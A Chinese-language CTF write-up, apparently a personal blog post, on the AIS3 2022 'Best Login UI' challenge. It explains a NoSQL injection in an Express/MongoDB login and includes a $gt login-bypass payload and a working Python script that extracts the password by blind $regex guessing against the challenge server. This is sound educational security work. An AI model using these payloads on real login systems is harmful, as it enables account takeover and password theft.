---
layout: post
title: NoSQL Injection - AIS3 2022 pre-exam The Best Login UI
tags: [CTF, web]
---
> 我做ㄌ世界上最棒的登入介面，現在給你看看 ><

![best-login-ui]({{"/assets/img/posts/ais3-2022/best-login-ui.png" | relative_url}}){:style="max-height: 800px; display: block; margin: auto"}

~~好啦比[去年的](https://blog.ovo.anderwei.net/archives/548)強~~

## 解題
這題是NoSQL Injection，從`app.js`可以看到問題在哪裡
```javascript
app.post('/login', async (req, res) => {
  const db = app.get('db');
  const { username, password } = req.body;
  console.log({username, password});
  const user = await db.collection('users').findOne({ username, password });
  if (user) {
      res.send('Success owo!');
  } else {
      res.send('Failed qwq');
  }
});
```

`findOne`這樣寫會被注入，可以在`password`用`{$gt: ""}`之類的東西把登入的部份bypass掉，像是`{username: "admin", password: {$gt: ""}}`

在ExpressJS中，發request的時候在對應欄位加`[]`可以寫一個object進去（這是由於ExpressJS中的[body-parser](https://www.npmjs.com/package/body-parser)使用[qs](https://www.npmjs.com/package/qs)去parse request body的關係）
> qs allows you to create nested objects within your query strings, by surrounding the name of sub-keys with square brackets `[]`. For example, the string `'foo[bar]=baz'` converts to:
> ```javascript
> assert.deepEqual(qs.parse('foo[bar]=baz'), {
>   foo: {
>     bar: 'baz'
>   }
> });
> ```

也就是說要得到那樣的輸入，在發request時用`username=admin&password[$gt]=""`就可以了

但這題沒有那麼簡單，就算成功登入後也拿不到flag，所以猜測flag其實是密碼，要用另外一個方法把密碼爆出來

爆密碼要用`$regex`去做，原理是猜當前的字元後用`+`結尾，如果成功登入就代表猜對字，反之就是猜錯

但regex就是難在有些保留字元要記得escape掉

解題script如下~~，可以看出我當初在哪裡痛苦很久~~
```python
import requests
import string

valid_input = string.printable[:-5] # FUCK SPACE IS ACTUALLY IN THE FLAG?
# flag = 'A153{'
flag = 'AIS3{Bl1nd-b4s3d'

# https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/
while True:
  for c in valid_input:
    data = {
      'username': 'admin',
      'password[$regex]': flag + ("\\" if c in "+*?^$\.[]{}()|/\\" else "") + c + "+"
    }
    print(data['password[$regex]'])
    # r = requests.post('http://localhost:54088/login', data=data)
    r = requests.post('http://chals1.ais3.org:54088/login', data=data)
    if 'owo' in r.text:
      flag += (("\\" if c in "+*?^$\.[]{}()|/\\" else "") + c)
      print(flag)
      if c == '}': exit(0)
      else: break
  print('====================================\n')

# AIS3{Bl1nd-b4s3d r3gex n0sq1i?! (:3[___]}
```

~~NoSQL injection比SQL injection有趣多了~~

後記：在打完之後跟Ander討論的時候，他講我才知道，原來題目的`index.html`就有放input space~~，哭啊~~
```html
<script>
function baseConvert(number) {
  const DIGITS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ ';
  const base = DIGITS.length;
  let str = '';
  let value = number;
  while (value > 0) {
    str = DIGITS[value % base] + str;
    value = Math.floor(value / base);
  }
  return str;
  }

  document.getElementById('username_input').oninput = function () {
    document.querySelector('input[name="username"]').value = baseConvert(this.value);
  };

  document.getElementById('password_input').oninput = function () {
    document.querySelector('input[name="password"]').value = baseConvert(this.value);
  };
</script>
```

## 參考資料
- [Hacking NodeJS and MongoDB](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html)
- [MongoDB - Extracting data (admin password) using NoSQL Injection - MMACTF 2016 Web 100 writeup \| Blog - 0daylabs](https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/)